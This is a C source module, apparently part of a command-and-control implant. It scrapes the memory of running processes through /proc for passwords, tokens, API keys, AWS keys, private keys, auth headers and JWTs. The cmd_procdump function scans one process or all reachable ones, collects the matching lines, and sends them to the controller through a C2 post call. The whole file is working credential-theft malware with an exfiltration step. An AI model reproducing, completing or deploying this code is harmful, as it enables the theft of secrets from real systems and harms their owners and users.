#define _GNU_SOURCE
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <ctype.h>

#include "tengu.h"

#define CHUNK_SZ   (1 << 20)   // 1 MB read buffer
#define SEG_MAX    (64 << 20)  // skip segments > 64 MB
#define OUT_MAX    131072       // 128 KB output cap
#define CTX_FWD    200          // chars after match
#define DEDUP_SZ   512          // dedup hash table entries

static const char* PATTERNS[] = {
    "password", "passwd", "secret", "token", "apikey", "api_key",
    "BEGIN RSA PRIVATE", "BEGIN OPENSSH PRIVATE",
    "BEGIN EC PRIVATE", "BEGIN DSA PRIVATE",
    "AWS_SECRET", "AKIA",
    "Authorization: Bearer", "Authorization: Basic",
    "eyJ",          // JWT
    "-----BEGIN",   // any PEM block
    NULL
};

// djb2 hash for dedup.
static unsigned long h_hash(const char* s, size_t len) {
    unsigned long h = 5381;
    for (size_t i = 0; i < len; i++)
        h = ((h << 5) + h) + (unsigned char)s[i];
    return h;
}

static unsigned long g_seen[DEDUP_SZ];
static int           g_nseen;

static int seen_before(const char* line, size_t len) {
    unsigned long h = h_hash(line, len);
    for (int i = 0; i < g_nseen; i++)
        if (g_seen[i] == h) return 1;
    if (g_nseen < DEDUP_SZ)
        g_seen[g_nseen++] = h;
    return 0;
}

// Case-insensitive memmem.
static const char* ci_memmem(const char* hay, size_t hlen,
                               const char* needle, size_t nlen) {
    if (nlen == 0 || hlen < nlen) return NULL;
    for (size_t i = 0; i <= hlen - nlen; i++) {
        size_t j;
        for (j = 0; j < nlen; j++) {
            char a = hay[i+j], b = needle[j];
            if (a >= 'A' && a <= 'Z') a |= 32;
            if (b >= 'A' && b <= 'Z') b |= 32;
            if (a != b) break;
        }
        if (j == nlen) return hay + i;
    }
    return NULL;
}

// Scan one memory chunk for all patterns. Appends lines to out.
static size_t scan_chunk(const char* chunk, size_t clen,
                          char* out, size_t opos, size_t omax) {
    for (int pi = 0; PATTERNS[pi] && opos < omax - 256; pi++) {
        const char* pat = PATTERNS[pi];
        size_t plen = strlen(pat);
        size_t pos = 0;

        while (pos + plen <= clen && opos < omax - 256) {
            const char* hit = ci_memmem(chunk + pos, clen - pos, pat, plen);
            if (!hit) break;

            size_t hit_off = (size_t)(hit - chunk);

            // Walk back to start of line (newline or NUL boundary).
            size_t ls = hit_off;
            while (ls > 0 && chunk[ls-1] != '\n' && chunk[ls-1] != '\0') ls--;

            // Walk forward to end of line, cap at CTX_FWD past match.
            size_t le = hit_off + plen;
            size_t cap = le + CTX_FWD;
            if (cap > clen) cap = clen;
            while (le < cap && chunk[le] != '\n' && chunk[le] != '\0') le++;

            size_t llen = le - ls;
            if (llen > 0 && llen < 512) {
                // Reject lines with too many non-printable bytes (binary noise).
                int bad = 0;
                for (size_t i = ls; i < le; i++) {
                    unsigned char c = (unsigned char)chunk[i];
                    if (c < 0x09 || (c > 0x0d && c < 0x20)) bad++;
                }
                if (bad <= (int)llen / 5 && !seen_before(chunk + ls, llen)) {
                    memcpy(out + opos, chunk + ls, llen);
                    opos += llen;
                    if (out[opos-1] != '\n') out[opos++] = '\n';
                }
            }

            pos = hit_off + 1;
        }
    }
    return opos;
}

// Dump one PID into out. Returns new opos.
static size_t dump_pid(int pid, char* out, size_t opos, size_t omax, char* chunk) {
    char maps_path[64], mem_path[64], comm_path[64];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    snprintf(mem_path,  sizeof(mem_path),  "/proc/%d/mem",  pid);
    snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", pid);

    FILE* maps = fopen(maps_path, "r");
    if (!maps) return opos;

    int memfd = open(mem_path, O_RDONLY);
    if (memfd < 0) { fclose(maps); return opos; }

    // Read process name.
    char procname[64] = "?";
    FILE* cf = fopen(comm_path, "r");
    if (cf) {
        if (fgets(procname, sizeof(procname), cf))
            procname[strcspn(procname, "\n")] = '\0';
        fclose(cf);
    }

    size_t start_opos = opos;
    // Reserve space for the header, write it after so we can skip empty results.
    char header[128];
    int hlen = snprintf(header, sizeof(header), "\n[PID %d - %s]\n", pid, procname);

    char line[512];
    while (fgets(line, sizeof(line), maps) && opos < omax - 512) {
        unsigned long long seg_start, seg_end;
        char perms[8] = {0};
        if (sscanf(line, "%llx-%llx %4s", &seg_start, &seg_end, perms) < 3) continue;
        if (perms[0] != 'r') continue;
        unsigned long long seg_size = seg_end - seg_start;
        if (seg_size == 0 || seg_size > (unsigned long long)SEG_MAX) continue;

        for (unsigned long long addr = seg_start; addr < seg_end && opos < omax - 256; ) {
            size_t want = CHUNK_SZ;
            if (addr + want > seg_end) want = (size_t)(seg_end - addr);

            ssize_t n = pread(memfd, chunk, want, (off_t)addr);
            if (n <= 0) break;

            size_t prev = opos;
            opos = scan_chunk(chunk, (size_t)n, out, opos, omax);
            (void)prev;

            addr += (unsigned long long)n;
        }
    }

    fclose(maps);
    close(memfd);

    // Only emit the header if we found something.
    if (opos > start_opos && hlen > 0 && start_opos + (size_t)hlen < omax) {
        memmove(out + start_opos + hlen, out + start_opos, opos - start_opos);
        memcpy(out + start_opos, header, hlen);
        opos += hlen;
    }

    return opos;
}

void cmd_procdump(uint32_t req_id, int pid) {
    char* out   = calloc(1, OUT_MAX);
    char* chunk = malloc(CHUNK_SZ);
    if (!out || !chunk) { free(out); free(chunk); return; }

    g_nseen = 0;
    memset(g_seen, 0, sizeof(g_seen));

    size_t opos = 0;

    if (pid > 0) {
        // Single PID.
        opos = dump_pid(pid, out, opos, OUT_MAX - 1, chunk);
        if (opos == 0) {
            snprintf(out, OUT_MAX,
                "procdump: PID %d - no patterns found or permission denied\n"
                "  hint: check /proc/sys/kernel/yama/ptrace_scope (need 0 or root)\n", pid);
        }
    } else {
        // Scan all accessible PIDs.
        DIR* proc = opendir("/proc");
        if (!proc) {
            snprintf(out, OUT_MAX, "procdump: cannot open /proc\n");
        } else {
            int our_pid = getpid();
            struct dirent* e;
            while ((e = readdir(proc)) != NULL && opos < OUT_MAX - 512) {
                int p = atoi(e->d_name);
                if (p <= 0 || p == our_pid) continue;
                opos = dump_pid(p, out, opos, OUT_MAX - 1, chunk);
            }
            closedir(proc);
            if (opos == 0)
                snprintf(out, OUT_MAX,
                    "procdump: nothing found (no readable processes or no pattern matches)\n"
                    "  hint: run as root for full access, check ptrace_scope\n");
        }
    }

    out[OUT_MAX - 1] = '\0';

    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, out);
    free(out);
    free(chunk);
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}
